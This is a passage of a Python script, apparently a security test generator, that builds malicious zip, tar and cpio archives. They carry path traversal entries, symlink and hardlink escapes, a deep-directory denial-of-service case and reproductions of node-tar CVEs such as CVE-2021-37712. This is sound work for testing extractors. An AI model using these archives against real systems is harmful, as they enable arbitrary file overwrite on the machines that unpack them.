        os.mkdir(f"{OUTPUT_DIR}/tar/gnu")
        os.mkdir(f"{OUTPUT_DIR}/tar/pax")
    if not os.path.exists(f"{OUTPUT_DIR}/tar.gz"):
        os.mkdir(f"{OUTPUT_DIR}/tar.gz")
        os.mkdir(f"{OUTPUT_DIR}/tar.gz/ustar")
        os.mkdir(f"{OUTPUT_DIR}/tar.gz/gnu")
        os.mkdir(f"{OUTPUT_DIR}/tar.gz/pax")
    if not os.path.exists(f"{OUTPUT_DIR}/tar.bz2"):
        os.mkdir(f"{OUTPUT_DIR}/tar.bz2")
        os.mkdir(f"{OUTPUT_DIR}/tar.bz2/ustar")
        os.mkdir(f"{OUTPUT_DIR}/tar.bz2/gnu")
        os.mkdir(f"{OUTPUT_DIR}/tar.bz2/pax")
    if not os.path.exists(f"{OUTPUT_DIR}/cpio"):
        os.mkdir(f"{OUTPUT_DIR}/cpio")
        for format in CPIO_CONFIG:
            os.mkdir(f"{OUTPUT_DIR}/cpio/{format}")

    os.chdir(INPUT_FOLDER)

    gnu_cpio_binary = "cpio"
    output = subprocess.check_output([gnu_cpio_binary, '--version']).decode()
    if "GNU cpio" in output:
        Logger.info("Good, your 'cpio' command is GNU cpio")
    else:
        # Use MacOS compiled binary
        gnu_cpio_binary = "../cpio-2.14-darwin"
        output = subprocess.check_output([gnu_cpio_binary, '--version']).decode()
        if not "GNU cpio" in output:
            Logger.info("Unfortunately we couldn't find a GNU cpio binary on your system. Please install GNU cpio.")
            return

    Logger.info(f"fyi, if you want to create .jar files, put a META-INF folder into {INPUT_FOLDER} and rename all .zip to .jar")
    Logger.info(f"The script will on-error print the exception (if a file can't be created) and then delete the corresponding archive file")
    Logger.info(f"Not printing any compatiblity issues with tar ustar format, as it is very limited in path length")
    Logger.info("Starting to generate files...")

    payloads_already = set()
    for name, payload, start, depths in PATH_TRAVERSAL_ATTACKS:
        for depth in depths:
            payload_path = start + payload * depth
            attack_name = f"{name}_{depth}"
            if payload_path in payloads_already:
                Logger.info(f"Warning, {payload_path} would be created twice, ignoring duplicate...")
                continue
            else:
                payloads_already.add(payload_path)
                ###
                # plain attacks in PATH_TRAVERSAL_ATTACKS
                ###
                for creator in (
                        ZipVariationCreator(),
                        TarVariationCreator(),
                        CpioVariationCreator(gnu_cpio_binary),
                ):
                    for archive in creator.create(attack_name):
                        try:
                            archive.add_cwd_content()
                            archive.add_dummy_file_at_path(payload_path)
                            archive.close()
                        except UnsupportedException as e:
                            Logger.info(e) if not 'ustar' in str(e) else ""
                            archive.close_and_remove()
                ###
                # tar.gz attack by attacking the included tar-name with PATH_TRAVERSAL_ATTACKS
                ###
                compression_file_ext = ".tar.gz"
                compression = "gz"
                attack_name = "tar_name_in_gz_" + attack_name
                for format, encodings in TAR_CONFIG:
                    for encoding in encodings:
                        for error in TAR_ERRORS_CONFIG:
                            try:
                                archive = CustomTarArchive(attack_name, compression_file_ext, compression, format, encoding, error, gz_tar_name=payload_path)
                            except FileAlreadyExistsException:
                                Logger.info(f"File already exists, not creating TAR {attack_name}, {compression_file_ext}, {compression}, {format}, {encoding}, {error}")
                                continue
                            archive.add_cwd_content()
                            archive.close()

    ###
    # (hard/sym)link attacks for LINK_ATTACKS
    ###
    for link_type in ("hard", "soft"):
        for attack_name, to_name_file_path in LINK_ATTACKS:
            for creator in (
                    ZipVariationCreator(),
                    TarVariationCreator(),
                    CpioVariationCreator(gnu_cpio_binary),
            ):
                for archive in creator.create(link_type + attack_name):
                    try:
                        archive.add_cwd_content()
                        if link_type == "hard":
                            from_name = archive.add_dummy_hardlink_to_path(to_name_file_path)
                        else:
                            from_name = archive.add_dummy_symlink_to_path(to_name_file_path)
                        # To make it more interesting, now that we have a link from_name -> to_name_file_path,
                        # try to write to from_name/D
                        archive.add_dummy_file_at_path(from_name + "/")
                        archive.close()
                    except UnsupportedException as e:
                        Logger.info(e) if not 'ustar' in str(e) else ""
                        archive.close_and_remove()

    ###
    # Hand crafted stuff
    ###

    for creator in (
            ZipVariationCreator(),
            TarVariationCreator(),
            CpioVariationCreator(gnu_cpio_binary),
    ):
        attack_name = "dos_500_deep_dir"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                archive.add_dummy_file_at_path("G/" * 500)
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        attack_name = "unpack_sw-description-symlink"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # If the attacked system only unpacks one file, but doesn't think that it could be a folder
                archive.add_dir("sw-description")
                archive.add_dummy_file_at_path("sw-description/")
                archive.add_symlink("sw-description/A", "A")
                archive.add_dummy_file_at_path("sw-description/A/")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()
        
        attack_name = "unpack_sw-description-path_traversal_1"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # If the attacked system only unpacks one file, but doesn't think that it could be a folder with path traversal inside
                archive.add_dir("sw-description")
                archive.add_dummy_file_at_path("sw-description/../../")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()
        
        attack_name = "unpack_sw-description-path_traversal_2"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # If the attacked system only unpacks one file, but doesn't think that it could be a path traversal folder
                archive.add_dummy_file_at_path("sw-description/../../")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()
        
        attack_name = "unpack_sw-description-path_traversal_3"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # If the attacked system only unpacks one file, but doesn't think that it could be located somewhere else
                archive.add_file("../../../../sw-description", FILE_CONTENT)
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()
        
        attack_name = "unpack_sw-description-path_traversal_4"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # If the attacked system only unpacks one file, but doesn't think that it could have multiple entries in the archive with that name
                archive.add_symlink("sw-description", "/")
                archive.add_dir("sw-description")
                archive.add_file("sw-description", FILE_CONTENT)
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        attack_name = "unpack_sw-description-hardlink"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # If the attacked system only unpacks one file, but doesn't think that it could be a folder
                archive.add_dir("sw-description")
                archive.add_dummy_file_at_path("sw-description/")
                archive.add_hardlink("sw-description/A", "A")
                archive.add_dummy_file_at_path("sw-description/A/")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        # Clashing unicode normalization names
        # TODO: unclear if correctly understood https://github.com/isaacs/node-tar/security/advisories/GHSA-qq89-hq3f-393p
        attack_name = "CVE-2021-37712"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # H h ʜ Η Н һ Ꮋ Ｈ ｈ
                # A specially crafted tar archive could thus include directories with two forms of the path that
                # resolve to the same file system entity ...
                archive.add_dir("ｈ")
                archive.add_dir("һ")
                # ... followed by a symbolic link with a name in the first form ...
                archive.add_symlink("ｈ", "../")
                # ... lastly followed by a file using the second form ...
                archive.add_file("һ", FILE_CONTENT)
                # ... It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar
                # file to symlink into an arbitrary location and subsequently extracting arbitrary files into that
                # location, thus allowing arbitrary file creation and overwrite.
                archive.add_dummy_file_at_path("ｈ/")
                archive.add_dummy_file_at_path("һ/")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        # Clashing unicode normalization names
        #TODO: unclear if correctly understood https://github.com/isaacs/node-tar/security/advisories/GHSA-9r2w-394v-53qc
        attack_name = "CVE-2021-37701_1"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # This logic was insufficient when extracting tar files that contained both a directory and a symlink
                # with the same name as the directory, where the symlink and directory names in the archive entry
                # used backslashes as a path separator on posix systems
                archive.add_dir("I")
                archive.add_dir("I\\J")
                archive.add_symlink("I\\J", "../")
                archive.add_dummy_file_at_path("I\\J\\")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        # Clashing unicode normalization names
        #TODO: unclear if correctly understood https://github.com/isaacs/node-tar/security/advisories/GHSA-9r2w-394v-53qc
        attack_name = "CVE-2021-37701_2"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # Additionally, a similar confusion could arise on case-insensitive filesystems. If a tar archive contained a directory at FOO, followed by a
                # symbolic link named foo, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the
                # filesystem, but not from the internal directory cache, as it would not be treated as a cache hit. A subsequent file entry within
                # the FOO directory would then be placed in the target of the symbolic link, thinking that the directory had already been created.
                archive.add_dir("K")
                archive.add_symlink("k", "../")
                archive.add_dummy_file_at_path("K/")
                archive.add_dummy_file_at_path("k/")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        # Clashing unicode normalization names
        #TODO: unclear if correctly understood https://github.com/isaacs/node-tar/security/advisories/GHSA-r628-mhmh-qjhw
        attack_name = "CVE-2021-32803"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                # This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory.
                # This order of operations resulted in the directory being created and added to the node-tar directory cache. When a directory is
                # present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where node-tar
                # checks for symlinks occur.
                archive.add_dir("L")
                archive.add_symlink("L", "../")
                archive.add_dummy_file_at_path("L/")
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

        # Maximum Windows path length according to
        # https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry
        attack_name = "windows_maxlength_1"
        for archive in creator.create(attack_name):
            try:
                archive.add_cwd_content()
                archive.add_dir("C:\\" + "A" * 256)
                # should cut away 1 character of PAYLOAD_DEFAULT_NAME
                archive.add_file("C:\\" + "A" * (255 - len(PAYLOAD_DEFAULT_NAME) + 1) + f"/{PAYLOAD_DEFAULT_NAME}",
                                 FILE_CONTENT)
                archive.close()
            except UnsupportedException as e:
                Logger.info(e) if not 'ustar' in str(e) else ""
                archive.close_and_remove()

    os.remove("../tmp_file")
    try:
        os.remove("../tmp_file2")
    except FileNotFoundError:
        pass
    #Logger.info("Cleaning up duplicates in output folder")
    DirectoryCleaner.delete_duplicates_recursively(f"../{OUTPUT_DIR}/", use_disc=False, dry_run=False)

class Logger:
    @staticmethod
    def info(*text):
        import datetime
        print("[+ " + str(datetime.datetime.now()) + "] "+str(" ".join(str(i) for i in text)))

class DirectoryCleaner:
    #filesizes dict can get pretty huge, so I ran out of memory before
    #so let's just put it on disc. Make sure you have enough space
    #in the mounted location. I had to replace the tmpfs on small embedded devices:
    #mkdir /mnt/external-usb/tmpfs-dir
    #umount /tmp
    #ln -s /mnt/external-usb/tmpfs-dir/ /tmp
    #Or simply use a location where you have enough space
    filesizes_file = '/tmp/filesizes'
    
    @staticmethod
    def find_duplicate_contents(rootdir, use_disc=False):
        import hashlib
        """Find duplicate files in directory tree."""
        if use_disc:
            #filesizes can get pretty huge, so I ran out of memory before
            #so let's just put it on disc. Make sure you have enough space
            #in the mounted location. I had to replace the tmpfs
            #mkdir /mnt/external-usb/tmpfs-dir
            #umount /tmp
            #ln -s /mnt/external-usb/tmpfs-dir/ /tmp
            #Or simply use a location where you have enough space!
            import shelve
            if os.path.isfile(DirectoryCleaner.filesizes_file):
                os.remove(DirectoryCleaner.filesizes_file)
            filesizes = shelve.open(DirectoryCleaner.filesizes_file)
        else:
            filesizes = {}
        #Logger.info("Building up dict with key as filesize and value is list of filenames...")
        for path, _, files in os.walk(rootdir):
            for filename in files:
                filepath = os.path.join(path, filename)
                filesize = os.stat(filepath).st_size
                #works with both, dict and shelve:
                k = filesizes.setdefault(str(filesize), set())
                k.add(filepath)
        # We are only interested in lists with more than one entry,
        # meaning a file can not have the same content if it has a
        # different size
        #Logger.info("Checking lists with more than one file...")
        lists_longer_than_one = [ flist for flist in filesizes.values() if len(flist)>1 ]
        #Logger.info("Checking " + str(len(lists_longer_than_one)) + " lists with more than one file...")
        i = 0
        for files in lists_longer_than_one:
            i += 1
            if i % 10000 == 0:
                Logger.info("Done " + str(i) + " lists...")
            if len(files) >= 10000:
                Logger.info("Found a list with " + str(len(files)) + " entries, will need to read that many files and calculate their hashes...")
            unique = set()
            for filepath in files:
                with open(filepath, "rb") as openfile:
                    # We are not interested in cryptographic strength, so let's use md5 here instead of sha256:
                    filehash = hashlib.md5(openfile.read()).digest()
                if filehash not in unique:
                    unique.add(filehash)
                else:
                    yield filepath
        if use_disc and os.path.isfile(DirectoryCleaner.filesizes_file):
            os.remove(DirectoryCleaner.filesizes_file)
    
    @staticmethod
    def delete_duplicates_recursively(search_dir, use_disc=False, dry_run=True):
        Logger.info("Removing duplicates in", search_dir)
        i = 0
        for duplicate in DirectoryCleaner.find_duplicate_contents(search_dir, use_disc=use_disc):
            if dry_run:
                Logger.info("[DRY-RUN] Deleting the duplicate file:", duplicate)
                i += 1
            else:
                #Logger.info("Deleting the duplicate file:", duplicate)
                i += 1
                os.remove(duplicate)
                # Also remove .txt file next to it
                filepath, filename = os.path.split(duplicate)
                txt_file = filepath + "/" + filename.split(".")[0] + ".txt"
                if os.path.exists(txt_file):
                    os.remove(txt_file)
                     
        Logger.info(f"Deleted {i} duplicates in", search_dir)

if __name__ == "__main__":
    main()
